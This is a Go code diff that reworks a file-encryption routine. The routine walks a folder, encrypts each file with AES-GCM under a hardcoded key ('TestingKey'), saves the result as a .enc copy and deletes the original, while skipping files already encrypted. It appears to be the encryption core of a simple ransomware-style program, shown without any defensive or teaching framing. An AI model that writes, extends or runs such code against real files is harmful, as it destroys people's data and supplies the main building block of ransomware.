@@ -6,7 +6,6 @@ import (
 	"crypto/md5"
 	"crypto/rand"
 	"encoding/hex"
-	"fmt"
 	"io"
 	"os"
 	"path/filepath"
@@ -20,26 +19,23 @@ func mdHashing(input string) string {
 }
 
 func Encryption() ([]byte, error) {
-
-	//Gonna check if the file is already encrypted
-
 	key := "TestingKey"
 	test_files, err := helper.Openfolder()
 	helper.Error(err)
 
 	for _, test_file := range test_files {
+		// Skip if the file is already encrypted
+		if filepath.Ext(test_file) == ".enc" {
+			continue
+		}
+
 		file_content, err := os.ReadFile(test_file)
-		extension := filepath.Ext(test_file)
-
 		helper.Error(err)
-
-		fmt.Printf("%s is the type of this file\n", extension)
 
 		aesBlock, err := aes.NewCipher([]byte(mdHashing(string(key))))
 		helper.Error(err)
 
 		gcmInstance, err := cipher.NewGCM(aesBlock)
-
 		helper.Error(err)
 
 		nonce := make([]byte, gcmInstance.NonceSize())
@@ -47,8 +43,14 @@ func Encryption() ([]byte, error) {
 
 		ciphered_text := gcmInstance.Seal(nonce, nonce, []byte(file_content), nil)
 
-		err = os.WriteFile(test_file, ciphered_text, 0644)
+		// Rename the file with .enc extension
+		encryptedFilePath := test_file + ".enc"
+		err = os.WriteFile(encryptedFilePath, ciphered_text, 0644)
+		helper.Error(err)
 
+		// Optionally, remove the original file
+		err = os.Remove(test_file)
+		helper.Error(err)
 	}
 	return nil, nil
 }
